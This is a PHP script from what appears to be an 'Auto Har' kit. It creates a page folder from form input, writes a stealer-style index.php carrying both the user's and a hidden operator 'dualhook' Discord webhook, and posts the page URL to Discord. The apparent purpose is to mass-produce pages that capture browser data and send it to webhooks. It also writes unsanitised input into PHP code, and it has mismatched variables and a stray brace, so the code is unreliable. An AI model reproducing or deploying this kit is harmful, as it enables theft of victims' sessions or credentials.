<?php
$folder = $_POST['folder'];
# ItsYaboyNathan
include("../settings.php");
if(!is_dir($folder)){
mkdir("../$folder");
} else {
die('Directory taken by another user');
}
$webhook = $_POST['webhook'];
$code = file_get_contents("../body_files/har.php");
$myfile = fopen("../$folder/index.php", "w");
$txt = $code;
fwrite($myfile, '<?php $dualhook = "'.$dualhook.'"; $webhook = "'.$webhook.'"; ?>'.$txt);
$headers = ["Content-Type: application/json; charset=utf-8"];
$POST = [
"username" => "$name - Notifier",
"avatar_url" => "",
"content" => "Hello!",
"embeds" => [
[
"title" => "Auto Har",
"type" => "rich",
"color" => hexdec("$color"),
"url" => "http://www." . $_SERVER["SERVER_NAME"] . "/$folder",
"fields" => [
[
"name" => "**Your Url:**",
"value" => "```http://www." . $_SERVER["SERVER_NAME"] . "/$folder```",
"inline" => false
],
],
],
],
];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $Dualwebhook);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response = curl_exec($ch);
header("location: ../$folder/");
}
?>
<style>
html {
scroll-behavior: smooth;
}
* {
margin: 0;
padding: 0;
box-sizing: border-box;
}
body {
font-family: -apple-system, BlinkMacSystemFont, sans-serif;
background: #121212; /* fallback for old browsers */
overflow-x: hidden;
height: 100%;

/* code to make all text unselectable */
-webkit-user-select: none;
-khtml-user-select: none;
-moz-user-select: none;
-ms-user-select: none;
-o-user-select: none;
user-select: none;
}
/* Disables selector ring */
body:not(.user-is-tabbing) button:focus,
body:not(.user-is-tabbing) input:focus,
body:not(.user-is-tabbing) select:focus,
body:not(.user-is-tabbing) textarea:focus {
outline: none;
}
</style>